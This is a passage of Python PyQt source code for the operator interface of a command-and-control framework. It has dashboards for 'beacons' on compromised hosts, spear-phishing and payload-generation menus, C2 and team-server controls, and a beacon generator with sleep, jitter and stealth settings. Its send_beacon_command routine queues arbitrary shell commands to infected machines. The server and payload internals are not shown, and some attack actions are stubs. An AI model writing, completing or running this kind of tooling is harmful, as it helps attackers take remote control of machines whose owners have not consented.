    def create_menu_bar(self):
        menubar = self.menuBar()
        
        file_menu = menubar.addMenu("File")
        
        new_action = QAction("New", self)
        new_action.setShortcut("Ctrl+N")
        file_menu.addAction(new_action)
        
        open_action = QAction("Open", self)
        open_action.setShortcut("Ctrl+O")
        file_menu.addAction(open_action)
        
        save_action = QAction("Save", self)
        save_action.setShortcut("Ctrl+S")
        file_menu.addAction(save_action)
        
        save_all_output_action = QAction("Save All Output", self)
        save_all_output_action.triggered.connect(self.save_all_output)
        file_menu.addAction(save_all_output_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.setShortcut("Ctrl+Q")
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        edit_menu = menubar.addMenu("Edit")
        
        copy_action = QAction("Copy", self)
        copy_action.setShortcut("Ctrl+C")
        edit_menu.addAction(copy_action)
        
        paste_action = QAction("Paste", self)
        paste_action.setShortcut("Ctrl+V")
        edit_menu.addAction(paste_action)
        
        view_menu = menubar.addMenu("View")
        
        dashboard_action = QAction("Dashboard", self)
        dashboard_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(0))
        view_menu.addAction(dashboard_action)
        
        beacons_action = QAction("Beacons", self)
        beacons_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(1))
        view_menu.addAction(beacons_action)
        
        attacks_action = QAction("Attacks", self)
        attacks_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(2))
        view_menu.addAction(attacks_action)
        
        attacks_menu = menubar.addMenu("Attacks")
        
        web_attack_action = QAction("Web Attack", self)
        attacks_menu.addAction(web_attack_action)
        
        spear_phish_action = QAction("Spear Phish", self)
        attacks_menu.addAction(spear_phish_action)
        
        generate_payload_action = QAction("Generate Payload", self)
        generate_payload_action.triggered.connect(self.generate_payload)
        attacks_menu.addAction(generate_payload_action)
        
        help_menu = menubar.addMenu("Help")
        
        about_action = QAction("About", self)
        help_menu.addAction(about_action)
        
    def create_toolbar(self):
        toolbar = QToolBar("Main Toolbar")
        self.addToolBar(toolbar)
        
        new_action = QAction("New", self)
        toolbar.addAction(new_action)
        
        open_action = QAction("Open", self)
        toolbar.addAction(open_action)
        
        save_action = QAction("Save", self)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        start_c2_action = QAction("Start C2", self)
        start_c2_action.triggered.connect(self.start_c2_server)
        toolbar.addAction(start_c2_action)
        
        stop_c2_action = QAction("Stop C2", self)
        stop_c2_action.triggered.connect(self.stop_c2_server)
        toolbar.addAction(stop_c2_action)
        
        toolbar.addSeparator()
        
        generate_beacon_action = QAction("Generate Beacon", self)
        generate_beacon_action.triggered.connect(self.generate_beacon)
        toolbar.addAction(generate_beacon_action)
        
        toolbar.addSeparator()
        
        run_script_action = QAction("Run Script", self)
        run_script_action.triggered.connect(self.run_script)
        toolbar.addAction(run_script_action)
        
    def create_dashboard_tab(self):
        dashboard_widget = QWidget()
        layout = QVBoxLayout(dashboard_widget)
        
        summary_layout = QHBoxLayout()
        
        beacons_group = QGroupBox("Beacons")
        beacons_layout = QVBoxLayout(beacons_group)
        self.beacons_count_label = QLabel("0")
        self.beacons_count_label.setAlignment(Qt.AlignCenter)
        self.beacons_count_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        beacons_layout.addWidget(self.beacons_count_label)
        beacons_layout.addWidget(QLabel("Active Beacons"))
        summary_layout.addWidget(beacons_group)
        
        targets_group = QGroupBox("Targets")
        targets_layout = QVBoxLayout(targets_group)
        self.targets_count_label = QLabel("0")
        self.targets_count_label.setAlignment(Qt.AlignCenter)
        self.targets_count_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        targets_layout.addWidget(self.targets_count_label)
        targets_layout.addWidget(QLabel("Active Targets"))
        summary_layout.addWidget(targets_group)
        
        attacks_group = QGroupBox("Attacks")
        attacks_layout = QVBoxLayout(attacks_group)
        self.attacks_count_label = QLabel("0")
        self.attacks_count_label.setAlignment(Qt.AlignCenter)
        self.attacks_count_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        attacks_layout.addWidget(self.attacks_count_label)
        attacks_layout.addWidget(QLabel("Running Attacks"))
        summary_layout.addWidget(attacks_group)
        
        layout.addLayout(summary_layout)
        
        recent_activity_group = QGroupBox("Recent Activity")
        recent_activity_layout = QVBoxLayout(recent_activity_group)
        
        self.recent_activity_list = QListWidget()
        recent_activity_layout.addWidget(self.recent_activity_list)
        
        layout.addWidget(recent_activity_group)
        
        self.tab_widget.addTab(dashboard_widget, "Dashboard")
        
    def create_beacons_tab(self):
        beacons_widget = QWidget()
        layout = QVBoxLayout(beacons_widget)
        
        view_toggle_layout = QHBoxLayout()
        
        self.view_toggle_group = QButtonGroup()
        
        table_view_button = QRadioButton("Table View")
        table_view_button.setChecked(True)
        self.view_toggle_group.addButton(table_view_button, 0)
        view_toggle_layout.addWidget(table_view_button)
        
        graph_view_button = QRadioButton("Graph View")
        self.view_toggle_group.addButton(graph_view_button, 1)
        view_toggle_layout.addWidget(graph_view_button)
        
        view_toggle_layout.addStretch()
        
        layout.addLayout(view_toggle_layout)
        
        self.beacons_stack = QStackedWidget()
        layout.addWidget(self.beacons_stack)
        
        self.beacons_table_widget = QWidget()
        table_layout = QVBoxLayout(self.beacons_table_widget)
        
        self.beacons_table = QTableWidget()
        self.beacons_table.setColumnCount(7)
        self.beacons_table.setHorizontalHeaderLabels(["ID", "Internal IP", "User", "Hostname", "OS", "Process", "Last Checkin"])
        self.beacons_table.horizontalHeader().setStretchLastSection(True)
        self.beacons_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.beacons_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.beacons_table.setAlternatingRowColors(True)
        self.beacons_table.setSortingEnabled(True)
        table_layout.addWidget(self.beacons_table)
        
        buttons_layout = QHBoxLayout()
        
        interact_button = QPushButton("Interact")
        interact_button.clicked.connect(self.interact_with_beacon)
        buttons_layout.addWidget(interact_button)
        
        remove_button = QPushButton("Remove")
        remove_button.clicked.connect(self.remove_beacon)
        buttons_layout.addWidget(remove_button)
        
        buttons_layout.addStretch()
        
        table_layout.addLayout(buttons_layout)
        
        beacon_output_group = QGroupBox("Beacon Output")
        beacon_output_layout = QVBoxLayout(beacon_output_group)
        
        self.beacon_output = QTextEdit()
        self.beacon_output.setReadOnly(True)
        self.beacon_output.setFont(QFont("Consolas", 10))
        beacon_output_layout.addWidget(self.beacon_output)
        
        table_layout.addWidget(beacon_output_group)
        
        self.beacons_stack.addWidget(self.beacons_table_widget)
        
        self.beacons_graph_widget = QWidget()
        graph_layout = QVBoxLayout(self.beacons_graph_widget)
        
        self.beacons_graph_view = BeaconGraphicsView()
        graph_layout.addWidget(self.beacons_graph_view)
        
        graph_buttons_layout = QHBoxLayout()
        
        graph_interact_button = QPushButton("Interact")
        graph_interact_button.clicked.connect(self.interact_with_beacon)
        graph_buttons_layout.addWidget(graph_interact_button)
        
        graph_remove_button = QPushButton("Remove")
        graph_remove_button.clicked.connect(self.remove_beacon)
        graph_buttons_layout.addWidget(graph_remove_button)
        
        graph_buttons_layout.addStretch()
        
        graph_layout.addLayout(graph_buttons_layout)
        
        self.beacons_stack.addWidget(self.beacons_graph_widget)
        
        self.view_toggle_group.buttonClicked.connect(self.toggle_beacons_view)
        
        self.tab_widget.addTab(beacons_widget, "Beacons")
        
    def toggle_beacons_view(self, button_id):
        self.beacons_stack.setCurrentIndex(button_id)
        if button_id == 1:
            self.update_beacons_graph()
            
    def update_beacons_graph(self):
        self.beacons_graph_view.clear_all()
        for beacon_id, beacon_info in self.beacons.items():
            self.beacons_graph_view.add_beacon(beacon_id, beacon_info)
            
    def create_attacks_tab(self):
        attacks_widget = QWidget()
        layout = QVBoxLayout(attacks_widget)
        
        self.attacks_table = QTableWidget()
        self.attacks_table.setColumnCount(5)
        self.attacks_table.setHorizontalHeaderLabels(["ID", "Type", "Target", "Status", "Start Time"])
        self.attacks_table.horizontalHeader().setStretchLastSection(True)
        self.attacks_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.attacks_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.attacks_table.setAlternatingRowColors(True)
        self.attacks_table.setSortingEnabled(True)
        layout.addWidget(self.attacks_table)
        
        buttons_layout = QHBoxLayout()
        
        new_attack_button = QPushButton("New Attack")
        new_attack_button.clicked.connect(self.new_attack)
        buttons_layout.addWidget(new_attack_button)
        
        stop_attack_button = QPushButton("Stop Attack")
        stop_attack_button.clicked.connect(self.stop_attack)
        buttons_layout.addWidget(stop_attack_button)
        
        buttons_layout.addStretch()
        
        layout.addLayout(buttons_layout)
        
        attack_output_group = QGroupBox("Attack Output")
        attack_output_layout = QVBoxLayout(attack_output_group)
        
        self.attack_output = QTextEdit()
        self.attack_output.setReadOnly(True)
        self.attack_output.setFont(QFont("Consolas", 10))
        attack_output_layout.addWidget(self.attack_output)
        
        layout.addWidget(attack_output_group)
        
        self.tab_widget.addTab(attacks_widget, "Attacks")
        
    def create_c2_tab(self):
        c2_widget = QWidget()
        layout = QVBoxLayout(c2_widget)
        
        c2_config_group = QGroupBox("C2 Configuration")
        c2_config_layout = QFormLayout(c2_config_group)
        
        self.c2_host_input = QLineEdit("0.0.0.0")
        c2_config_layout.addRow("Host:", self.c2_host_input)
        
        self.c2_port_input = QSpinBox()
        self.c2_port_input.setRange(1, 65535)
        self.c2_port_input.setValue(8080)
        c2_config_layout.addRow("Port:", self.c2_port_input)
        
        self.c2_ssl_checkbox = QCheckBox("Enable SSL")
        c2_config_layout.addRow("SSL:", self.c2_ssl_checkbox)
        
        self.c2_cert_input = QLineEdit()
        self.c2_cert_input.setPlaceholderText("Path to certificate file")
        c2_config_layout.addRow("Certificate:", self.c2_cert_input)
        
        self.c2_key_input = QLineEdit()
        self.c2_key_input.setPlaceholderText("Path to private key file")
        c2_config_layout.addRow("Private Key:", self.c2_key_input)
        
        self.c2_profile_input = QLineEdit()
        self.c2_profile_input.setPlaceholderText("Path to Malleable C2 profile")
        c2_config_layout.addRow("Profile:", self.c2_profile_input)
        
        layout.addWidget(c2_config_group)
        
        c2_status_group = QGroupBox("C2 Status")
        c2_status_layout = QVBoxLayout(c2_status_group)
        
        self.c2_status_label = QLabel("Stopped")
        self.c2_status_label.setAlignment(Qt.AlignCenter)
        self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
        c2_status_layout.addWidget(self.c2_status_label)
        
        layout.addWidget(c2_status_group)
        
        c2_buttons_layout = QHBoxLayout()
        
        self.start_c2_button = QPushButton("Start C2 Server")
        self.start_c2_button.clicked.connect(self.start_c2_server)
        c2_buttons_layout.addWidget(self.start_c2_button)
        
        self.stop_c2_button = QPushButton("Stop C2 Server")
        self.stop_c2_button.clicked.connect(self.stop_c2_server)
        self.stop_c2_button.setEnabled(False)
        c2_buttons_layout.addWidget(self.stop_c2_button)
        
        c2_buttons_layout.addStretch()
        
        layout.addLayout(c2_buttons_layout)
        
        c2_output_group = QGroupBox("C2 Output")
        c2_output_layout = QVBoxLayout(c2_output_group)
        
        self.c2_output = QTextEdit()
        self.c2_output.setReadOnly(True)
        self.c2_output.setFont(QFont("Consolas", 10))
        c2_output_layout.addWidget(self.c2_output)
        
        layout.addWidget(c2_output_group)
        
        self.tab_widget.addTab(c2_widget, "C2")
        
    def create_listener_tab(self):
        listener_widget = QWidget()
        layout = QVBoxLayout(listener_widget)
        
        listener_config_group = QGroupBox("Listener Configuration")
        listener_config_layout = QFormLayout(listener_config_group)
        
        self.listener_name_input = QLineEdit()
        self.listener_name_input.setPlaceholderText("Listener name")
        listener_config_layout.addRow("Name:", self.listener_name_input)
        
        self.listener_type_combo = QComboBox()
        self.listener_type_combo.addItems(["HTTP", "HTTPS", "DNS", "TCP", "SMB"])
        listener_config_layout.addRow("Type:", self.listener_type_combo)
        
        self.listener_host_input = QLineEdit()
        self.listener_host_input.setPlaceholderText("Host/IP")
        listener_config_layout.addRow("Host:", self.listener_host_input)
        
        self.listener_port_input = QSpinBox()
        self.listener_port_input.setRange(1, 65535)
        self.listener_port_input.setValue(80)
        listener_config_layout.addRow("Port:", self.listener_port_input)
        
        self.listener_ssl_checkbox = QCheckBox("Enable SSL")
        listener_config_layout.addRow("SSL:", self.listener_ssl_checkbox)
        
        layout.addWidget(listener_config_group)
        
        listener_buttons_layout = QHBoxLayout()
        
        self.add_listener_button = QPushButton("Add Listener")
        self.add_listener_button.clicked.connect(self.add_listener)
        listener_buttons_layout.addWidget(self.add_listener_button)
        
        self.remove_listener_button = QPushButton("Remove Listener")
        self.remove_listener_button.clicked.connect(self.remove_listener)
        listener_buttons_layout.addWidget(self.remove_listener_button)
        
        listener_buttons_layout.addStretch()
        
        layout.addLayout(listener_buttons_layout)
        
        self.listeners_table = QTableWidget()
        self.listeners_table.setColumnCount(5)
        self.listeners_table.setHorizontalHeaderLabels(["Name", "Type", "Host", "Port", "Status"])
        self.listeners_table.horizontalHeader().setStretchLastSection(True)
        self.listeners_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.listeners_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.listeners_table.setAlternatingRowColors(True)
        self.listeners_table.setSortingEnabled(True)
        layout.addWidget(self.listeners_table)
        
        self.tab_widget.addTab(listener_widget, "Listeners")
        
    def create_scripts_tab(self):
        scripts_widget = QWidget()
        layout = QVBoxLayout(scripts_widget)
        
        scripts_list_group = QGroupBox("Scripts")
        scripts_list_layout = QVBoxLayout(scripts_list_group)
        
        self.scripts_list = QListWidget()
        self.scripts_list.setSelectionMode(QAbstractItemView.SingleSelection)
        scripts_list_layout.addWidget(self.scripts_list)
        
        layout.addWidget(scripts_list_group)
        
        script_editor_group = QGroupBox("Script Editor")
        script_editor_layout = QVBoxLayout(script_editor_group)
        
        self.script_editor = QTextEdit()
        self.script_editor.setFont(QFont("Consolas", 10))
        script_editor_layout.addWidget(self.script_editor)
        
        layout.addWidget(script_editor_group)
        
        script_buttons_layout = QHBoxLayout()
        
        self.new_script_button = QPushButton("New")
        self.new_script_button.clicked.connect(self.new_script)
        script_buttons_layout.addWidget(self.new_script_button)
        
        self.save_script_button = QPushButton("Save")
        self.save_script_button.clicked.connect(self.save_script)
        script_buttons_layout.addWidget(self.save_script_button)
        
        self.load_script_button = QPushButton("Load")
        self.load_script_button.clicked.connect(self.load_script)
        script_buttons_layout.addWidget(self.load_script_button)
        
        self.execute_script_button = QPushButton("Execute")
        self.execute_script_button.clicked.connect(self.execute_script)
        script_buttons_layout.addWidget(self.execute_script_button)
        
        script_buttons_layout.addStretch()
        
        layout.addLayout(script_buttons_layout)
        
        self.tab_widget.addTab(scripts_widget, "Scripts")
        
    def create_team_server_tab(self):
        team_server_widget = QWidget()
        layout = QVBoxLayout(team_server_widget)
        
        team_server_config_group = QGroupBox("Team Server Configuration")
        team_server_config_layout = QFormLayout(team_server_config_group)
        
        self.team_server_host_input = QLineEdit("0.0.0.0")
        team_server_config_layout.addRow("Host:", self.team_server_host_input)
        
        self.team_server_port_input = QSpinBox()
        self.team_server_port_input.setRange(1, 65535)
        self.team_server_port_input.setValue(8081)
        team_server_config_layout.addRow("Port:", self.team_server_port_input)
        
        layout.addWidget(team_server_config_group)
        
        team_server_status_group = QGroupBox("Team Server Status")
        team_server_status_layout = QVBoxLayout(team_server_status_group)
        
        self.team_server_status_label = QLabel("Stopped")
        self.team_server_status_label.setAlignment(Qt.AlignCenter)
        self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
        team_server_status_layout.addWidget(self.team_server_status_label)
        
        layout.addWidget(team_server_status_group)
        
        team_server_buttons_layout = QHBoxLayout()
        
        self.start_team_server_button = QPushButton("Start Team Server")
        self.start_team_server_button.clicked.connect(self.start_team_server)
        team_server_buttons_layout.addWidget(self.start_team_server_button)
        
        self.stop_team_server_button = QPushButton("Stop Team Server")
        self.stop_team_server_button.clicked.connect(self.stop_team_server)
        self.stop_team_server_button.setEnabled(False)
        team_server_buttons_layout.addWidget(self.stop_team_server_button)
        
        team_server_buttons_layout.addStretch()
        
        layout.addLayout(team_server_buttons_layout)
        
        team_server_splitter = QSplitter(Qt.Horizontal)
        
        team_server_clients_group = QGroupBox("Connected Clients")
        team_server_clients_layout = QVBoxLayout(team_server_clients_group)
        
        self.team_server_clients_list = QListWidget()
        team_server_clients_layout.addWidget(self.team_server_clients_list)
        
        team_server_splitter.addWidget(team_server_clients_group)
        
        team_server_chat_group = QGroupBox("Team Chat")
        team_server_chat_layout = QVBoxLayout(team_server_chat_group)
        
        self.team_server_chat_output = QTextEdit()
        self.team_server_chat_output.setReadOnly(True)
        self.team_server_chat_output.setFont(QFont("Consolas", 10))
        team_server_chat_layout.addWidget(self.team_server_chat_output)
        
        team_server_chat_input_layout = QHBoxLayout()
        
        self.team_server_chat_input = QLineEdit()
        self.team_server_chat_input.setPlaceholderText("Type message...")
        team_server_chat_input_layout.addWidget(self.team_server_chat_input)
        
        self.team_server_send_button = QPushButton("Send")
        self.team_server_send_button.clicked.connect(self.send_team_chat_message)
        team_server_chat_input_layout.addWidget(self.team_server_send_button)
        
        team_server_chat_layout.addLayout(team_server_chat_input_layout)
        
        team_server_splitter.addWidget(team_server_chat_group)
        
        team_server_splitter.setSizes([200, 400])
        
        layout.addWidget(team_server_splitter)
        
        self.tab_widget.addTab(team_server_widget, "Team Server")
        
    def create_view_tab(self):
        view_widget = QWidget()
        layout = QVBoxLayout(view_widget)
        
        self.web_view = QWebEngineView()
        layout.addWidget(self.web_view)
        
        nav_layout = QHBoxLayout()
        
        self.back_button = QPushButton("Back")
        self.back_button.clicked.connect(self.web_view.back)
        nav_layout.addWidget(self.back_button)
        
        self.forward_button = QPushButton("Forward")
        self.forward_button.clicked.connect(self.web_view.forward)
        nav_layout.addWidget(self.forward_button)
        
        self.refresh_button = QPushButton("Refresh")
        self.refresh_button.clicked.connect(self.web_view.reload)
        nav_layout.addWidget(self.refresh_button)
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Enter URL...")
        nav_layout.addWidget(self.url_input)
        
        self.go_button = QPushButton("Go")
        self.go_button.clicked.connect(self.navigate_to_url)
        nav_layout.addWidget(self.go_button)
        
        layout.addLayout(nav_layout)
        
        self.tab_widget.addTab(view_widget, "View")
        
    def setup_system_tray(self):
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        
        show_action = QAction("Show", self)
        show_action.triggered.connect(self.show)
        tray_menu.addAction(show_action)
        
        hide_action = QAction("Hide", self)
        hide_action.triggered.connect(self.hide)
        tray_menu.addAction(hide_action)
        
        tray_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        tray_menu.addAction(exit_action)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
        
    def setup_timers(self):
        self.dashboard_timer = QTimer(self)
        self.dashboard_timer.timeout.connect(self.update_dashboard)
        self.dashboard_timer.start(5000)
        
        self.beacons_timer = QTimer(self)
        self.beacons_timer.timeout.connect(self.update_beacons)
        self.beacons_timer.start(2000)
        
        self.attacks_timer = QTimer(self)
        self.attacks_timer.timeout.connect(self.update_attacks)
        self.attacks_timer.start(3000)
        
        self.team_server_timer = QTimer(self)
        self.team_server_timer.timeout.connect(self.update_team_server)
        self.team_server_timer.start(1000)
        
    def update_dashboard(self):
        self.beacons_count_label.setText(str(len(self.beacons)))
        self.targets_count_label.setText(str(len(self.beacons)))
        self.attacks_count_label.setText("0")
        
        if len(self.log_entries) > 0:
            self.recent_activity_list.clear()
            for entry in self.log_entries[-10:]:
                item_text = f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}"
                if entry.get('detail'):
                    item_text += f" - {entry['detail']}"
                self.recent_activity_list.addItem(item_text)
        
    def update_beacons(self):
        self.beacons_table.setRowCount(len(self.beacons))
        
        row = 0
        for beacon_id, beacon_info in self.beacons.items():
            self.beacons_table.setItem(row, 0, QTableWidgetItem(beacon_id))
            self.beacons_table.setItem(row, 1, QTableWidgetItem(beacon_info.get("address", ["N/A"])[0]))
            self.beacons_table.setItem(row, 2, QTableWidgetItem(beacon_info.get("user", "N/A")))
            self.beacons_table.setItem(row, 3, QTableWidgetItem(beacon_info.get("hostname", "N/A")))
            self.beacons_table.setItem(row, 4, QTableWidgetItem(beacon_info.get("os", "N/A")))
            self.beacons_table.setItem(row, 5, QTableWidgetItem(beacon_info.get("process", "N/A")))
            
            last_checkin = beacon_info.get("last_checkin", 0)
            if last_checkin > 0:
                last_checkin_str = datetime.fromtimestamp(last_checkin).strftime("%Y-%m-%d %H:%M:%S")
            else:
                last_checkin_str = "N/A"
            
            self.beacons_table.setItem(row, 6, QTableWidgetItem(last_checkin_str))
            
            row += 1
        
        self.beacons_table.resizeColumnsToContents()
        
    def update_attacks(self):
        pass
        
    def update_team_server(self):
        if self.team_server:
            clients = self.team_server.get_clients()
            
            current_clients = set()
            for i in range(self.team_server_clients_list.count()):
                item = self.team_server_clients_list.item(i)
                current_clients.add(item.text())
            
            new_clients = set()
            for client_id, client_info in clients.items():
                client_text = f"{client_info['username']} ({client_info['address'][0]})"
                new_clients.add(client_text)
                
                if client_text not in current_clients:
                    self.team_server_clients_list.addItem(client_text)
            
            for i in range(self.team_server_clients_list.count()):
                item = self.team_server_clients_list.item(i)
                if item.text() not in new_clients:
                    self.team_server_clients_list.takeItem(i)
            
            chat_history = self.team_server.get_chat_history(limit=20)
            for entry in chat_history:
                timestamp = datetime.fromtimestamp(entry["timestamp"]).strftime("%H:%M:%S")
                message = f"[{timestamp}] {entry['sender']}: {entry['message']}"
                
                cursor = self.team_server_chat_output.textCursor()
                cursor.movePosition(QTextCursor.End)
                cursor.insertText(message + "\n")
                self.team_server_chat_output.setTextCursor(cursor)
                self.team_server_chat_output.ensureCursorVisible()
                
    def interact_with_beacon(self):
        selected_items = self.beacons_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a beacon to interact with.")
            return
        
        row = selected_items[0].row()
        beacon_id = self.beacons_table.item(row, 0).text()
        
        dialog = EnhancedBeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
        dialog.command_sent.connect(self.send_beacon_command)
        dialog.exec_()
        
    def send_beacon_command(self, beacon_id, command):
        if self.c2_server and beacon_id in self.c2_server.clients:
            task_id = self.c2_server.add_task(beacon_id, "shell", command)
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "command",
                "target": beacon_id,
                "status": "sent",
                "detail": command
            })
            
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.beacon_output.append(f"[{timestamp}] > {command}")
            
            self.status_bar.showMessage(f"Command sent to beacon {beacon_id}")
        else:
            QMessageBox.warning(self, "Error", f"Beacon {beacon_id} not connected or C2 server not running.")
            
    def add_beacon_result(self, beacon_id, result):
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if "stdout" in result and result["stdout"]:
            self.beacon_output.append(f"[{timestamp}] {result['stdout']}")
        
        if "stderr" in result and result["stderr"]:
            self.beacon_output.append(f"[{timestamp}] {result['stderr']}")
        
        self.log_entries.append({
            "time": timestamp,
            "action": "result",
            "target": beacon_id,
            "status": "received",
            "detail": f"stdout: {result.get('stdout', '')}, stderr: {result.get('stderr', '')}"
        })
        
    def remove_beacon(self):
        selected_items = self.beacons_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a beacon to remove.")
            return
        
        row = selected_items[0].row()
        beacon_id = self.beacons_table.item(row, 0).text()
        
        reply = QMessageBox.question(self, "Confirm Removal", 
                                    f"Are you sure you want to remove beacon {beacon_id}?",
                                    QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            if beacon_id in self.beacons:
                del self.beacons[beacon_id]
                
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "remove",
                    "target": beacon_id,
                    "status": "success"
                })
                
                self.status_bar.showMessage(f"Beacon {beacon_id} removed")
                
    def remove_beacon_by_id(self, beacon_id):
        if beacon_id in self.beacons:
            del self.beacons[beacon_id]
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "remove",
                "target": beacon_id,
                "status": "success"
            })
            
            self.status_bar.showMessage(f"Beacon {beacon_id} removed")
            
            return True
        return False
    
    def select_beacon(self, beacon_id):
        for row in range(self.beacons_table.rowCount()):
            if self.beacons_table.item(row, 0).text() == beacon_id:
                self.beacons_table.selectRow(row)
                return True
        return False
    
    def add_log_entry(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.beacon_output.append(f"[{timestamp}] {message}")
        
    def new_attack(self):
        QMessageBox.information(self, "New Attack", "New attack functionality not implemented yet.")
        
    def stop_attack(self):
        QMessageBox.information(self, "Stop Attack", "Stop attack functionality not implemented yet.")
        
    def start_c2_server(self):
        host = self.c2_host_input.text()
        port = self.c2_port_input.value()
        ssl_enabled = self.c2_ssl_checkbox.isChecked()
        cert_file = self.c2_cert_input.text() if ssl_enabled else None
        key_file = self.c2_key_input.text() if ssl_enabled else None
        profile_path = self.c2_profile_input.text() if self.c2_profile_input.text() else None
        
        self.c2_server = C2Server(host, port, ssl_enabled, cert_file, key_file)
        
        if self.c2_server.start():
            self.c2_status_label.setText("Running")
            self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: green;")
            
            self.start_c2_button.setEnabled(False)
            self.stop_c2_button.setEnabled(True)
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "start_c2",
                "target": f"{host}:{port}",
                "status": "success"
            })
            
            self.status_bar.showMessage(f"C2 server started on {host}:{port}")
            
            self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server started on {host}:{port}")
        else:
            self.c2_status_label.setText("Failed to Start")
            self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "start_c2",
                "target": f"{host}:{port}",
                "status": "failed"
            })
            
            self.status_bar.showMessage("Failed to start C2 server")
            
            self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] Failed to start C2 server on {host}:{port}")
            
    def stop_c2_server(self):
        if self.c2_server:
            self.c2_server.stop()
            self.c2_server = None
            
            self.c2_status_label.setText("Stopped")
            self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
            
            self.start_c2_button.setEnabled(True)
            self.stop_c2_button.setEnabled(False)
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "stop_c2",
                "target": "C2 Server",
                "status": "success"
            })
            
            self.status_bar.showMessage("C2 server stopped")
            
            self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server stopped")
            
    def start_team_server(self):
        host = self.team_server_host_input.text()
        port = self.team_server_port_input.value()
        
        self.team_server = TeamServer(host, port)
        
        if self.team_server.start():
            self.team_server_status_label.setText("Running")
            self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: green;")
            
            self.start_team_server_button.setEnabled(False)
            self.stop_team_server_button.setEnabled(True)
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "start_team_server",
                "target": f"{host}:{port}",
                "status": "success"
            })
            
            self.status_bar.showMessage(f"Team server started on {host}:{port}")
        else:
            self.team_server_status_label.setText("Failed to Start")
            self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "start_team_server",
                "target": f"{host}:{port}",
                "status": "failed"
            })
            
            self.status_bar.showMessage("Failed to start team server")
            
    def stop_team_server(self):
        if self.team_server:
            self.team_server.stop()
            self.team_server = None
            
            self.team_server_status_label.setText("Stopped")
            self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
            
            self.start_team_server_button.setEnabled(True)
            self.stop_team_server_button.setEnabled(False)
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "stop_team_server",
                "target": "Team Server",
                "status": "success"
            })
            
            self.status_bar.showMessage("Team server stopped")
            
    def send_team_chat_message(self):
        message = self.team_server_chat_input.text().strip()
        if message and self.team_server:
            self.team_server.send_chat_message("local", message)
            self.team_server_chat_input.clear()
            
    def generate_beacon(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Generate Beacon")
        layout = QFormLayout(dialog)
        
        host_input = QLineEdit()
        layout.addRow("C2 Host:", host_input)
        
        port_input = QSpinBox()
        port_input.setRange(1, 65535)
        port_input.setValue(8080)
        layout.addRow("C2 Port:", port_input)
        
        type_combo = QComboBox()
        type_combo.addItems(["http", "https", "dns", "tcp", "smb"])
        layout.addRow("Beacon Type:", type_combo)
        
        ssl_checkbox = QCheckBox()
        layout.addRow("SSL:", ssl_checkbox)
        
        profile_input = QLineEdit()
        profile_input.setPlaceholderText("Path to Malleable C2 profile")
        layout.addRow("Profile:", profile_input)
        
        sleep_input = QSpinBox()
        sleep_input.setRange(1, 3600)
        sleep_input.setValue(60)
        layout.addRow("Sleep Time (seconds):", sleep_input)
        
        jitter_input = QDoubleSpinBox()
        jitter_input.setRange(0.0, 1.0)
        jitter_input.setSingleStep(0.1)
        jitter_input.setValue(0.3)
        layout.addRow("Jitter:", jitter_input)
        
        stealth_checkbox = QCheckBox()
        stealth_checkbox.setChecked(True)
        layout.addRow("Stealth Mode:", stealth_checkbox)
        
